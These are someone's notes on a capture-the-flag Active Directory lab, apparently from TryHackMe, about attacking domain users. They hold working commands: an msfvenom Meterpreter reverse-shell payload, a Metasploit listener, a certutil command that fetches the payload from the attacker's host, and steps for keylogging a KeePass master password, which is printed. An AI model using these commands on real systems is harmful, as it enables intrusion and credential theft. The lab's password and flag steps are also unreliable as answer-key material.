<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>AD Users</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>AD Users</h1><br/><strong><h1>Exploiting AD Users</h1></strong><br /><br />We have gotten quite far with our exploitation up to this point. We have full administrative access to workstations and servers. Essentially, we can perform post-exploitation on almost any Tier 1 and Tier 2 system. But we still want to go further. This next task can also be seen as post-exploitation but is often an excellent thing to use when we are still performing exploitation to reach a suitable position for goal execution. It is time for us to target AD users.<br /><br /><br /><strong><h3>Users and User Behavior</h3></strong><br /><br />Users are, unfortunately, often the weakest link in the security chain. Just think about weak passwords and bad habits, such as granting overly permissive permissions. It would be ignorant and ineffective to overlook this attack surface. While it is good to build up a proper enumeration and attack methodology against AD users, in this task, we will focus on two elements:<br /><br />    ▪ <strong>Credential Management</strong> - How users store their credentials. In AD, this is quite important since users may have multiple sets of credentials and remembering all of them can be a hassle.<br />    ▪ <strong>Keylogging</strong> - Often, during exploitation, we need to understand how normal users interact with a system. Together with screengrabs, Keylogging can be a useful tool to gain this understanding from an attacker&#39;s perspective.<br /><br />    <br /><strong><h3>Hunting for Credentials</h3></strong><br /><br />Now that we have compromised THMSERVER1, we should probably look around to see if there is any useful information. Have a look at the user directories and see if there is some useful information in any of them.<br /><br />Your enumeration efforts should lead you to a <strong>.kdbx</strong> file. A quick Google should confirm our suspicion that this file is indeed very valuable! We can use Meterpreter&#39;s download command to recover this file.<br /><br />This file seems to be a credential database. The issue, however, is that the database is encrypted with a password. We could attempt to crack the password, but anyone who uses a credential database usually has the savvy to make sure the initial password is secure. We may have more success seeing how the user interacts with this database.<br /><br />We found a file named: <strong>PasswordDatabase.kdbx</strong> in the location <strong>C:\Users\trevor.local\Documents</strong><br /><br /><br /><strong>SYSTEM is Sometimes Too Privileged</strong><br /><br />Meterpreter has a built-in keylogger. This will be useful for extracting the user&#39;s keystrokes. However, we can&#39;t just start this keylogger and hope for the best since our shell is currently running in the SYSTEM context. SYSTEM won&#39;t be typing any keystrokes, so this won&#39;t help us. To capture the correct user&#39;s credentials, we will need to ensure that our shell is running in the context of that user.<br /><br />Fortunately, Meterpreter provides us with a migrate feature, and since we are running as SYSTEM, we should be able to migrate to any process. You have remote code execution on THMSERVER1, use this to get a Meterpreter shell.<br /><br /><strong>Payload:</strong><br /><strong>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.50.78.95 LPORT=8888 -f psh -o cybex.ps1</strong><br /><br /><strong>Start Metasploit Listener:</strong><br /><strong>msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.78.95; set LPORT 8888;exploit&quot;</strong><br /><br />Then, host this on python web server.<br />Next, Connect to <strong>THMSERVER1</strong> using <strong>Kerberos Delegation Exploit</strong> (Discussed Earlier)<br />Then, download our shell using the following.<br /><br /><strong>certutil.exe -urlcache -split -f http://10.50.78.95/shell.ps1</strong><br /><br />Then, execute the shell to get a meterpreter session.<br />Once you have a meterpreter shell, you can continue. The first step is to see if the users have any running processes on this machine:<br /><br /><img src="images/351-1.png" alt="images/351-1.png" /><br /><br />Then, we migrate to this process <br /><img src="images/351-2.png" alt="images/351-2.png" /><br /><br />Check UID<br /><img src="images/351-3.png" alt="images/351-3.png" /><br /><br />Start Keylogger<br /><img src="images/351-4.png" alt="images/351-4.png" /><br /><br />Now we have to be patient and wait. If we are lucky, we will capture some credentials! Give it a couple of minutes, and then run the following to dump captured keystrokes:<br /><img src="images/351-5.png" alt="images/351-5.png" /><br /><br />Then, Stop Keylogger: <strong>keyscan_stop</strong><br />Password Found: <strong>Imreallysurenoonewillguessmypassword</strong><br /><br /><strong>Note:</strong> I did not find any user based process to migrate into &amp; run the keylogger. I used writeups to get the password.<br />[Maybe Restarting the Network will solve this issue]<br /><br />This is a straightforward example of targeting AD users. There is a lot more that can be done. It is essential to include user targeting in your exploitation methodology for AD. To answer the questions for this task you will need Keepass.<br /><br /><strong>apt install keypassx</strong><br /><br />It is used to open the password database.<br /><br />1. Run keepassx<br />2. Feed the Password database file<br />3. Enter the above password when prompted<br />4. View the password in <strong>PasswordDatabase/general/flag</strong><br /><br /><img src="images/351-6.png" alt="images/351-6.png" /><br /><br />Then,<br /><img src="images/351-7.png" alt="images/351-7.png" /><br /><br />Right Click View entry/Double Click<br /><img src="images/351-8.png" alt="images/351-8.png" /></div>
</body>
</html>
